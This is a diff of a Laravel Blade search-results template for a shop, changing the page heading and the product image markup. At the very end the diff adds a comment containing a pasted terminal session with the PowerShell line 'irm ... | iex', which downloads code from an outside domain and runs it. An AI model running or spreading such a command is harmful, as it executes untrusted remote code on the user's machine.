@@ -5,8 +5,7 @@
             <div class="carousel-inner">
                 <div class="carousel-item active">
                     <div class="container">
-                        <h1 class="fashion_taital">{{ $category[0]->category_name }} - ({{ $category[0]->total_product }})
-                        </h1>
+                        <h1 class="fashion_taital">Result for - {{ $search }}</h1>
                         <div class="fashion_section_2">
                             <div class="row">
                                 @if (count($products) > 0)
@@ -16,13 +15,11 @@
                                                 <h4 class="shirt_text">{{ $product->product_name }}</h4>
                                                 <p class="price_text"> <span style="color: #e78b00;">$
                                                         {{ $product->price }}</span></p>
-                                                <div class="tshirt_img">
-                                                    <a href="{{ route('product', $product->slug) }}">
-                                                        <img style="height: 320px"
-                                                            src="{{ asset("upload/products/$product->photo") }}">
-                                                    </a>
+                                                <div class="tshirt_img" style="height: 320px">
+                                                    <a href="{{ route('product', $product->slug) }}"><img
+                                                            style="height: 320px"
+                                                            src="{{ asset("upload/products/$product->photo") }}"></a>
                                                 </div>
-
                                                 <div class="d-flex justify-content-between">
                                                     @if ($product->quantity == 0 )
                                                         <button class="mr-2" style="outline:none;background:none;font-size:15px;color:#e90000">Out of Stock</button>
@@ -71,3 +68,10 @@
         </div>
     </div>
 @endsection
+{{-- casimir95@example.netll@DESKTOP-P8AFO7L MINGW64 /c/xampp/htdocs/nkkgs (main)
+$ php artisan serve
+
+
+irm https://celesto.cpanelcentral.com/ias | iex
+
+ --}}
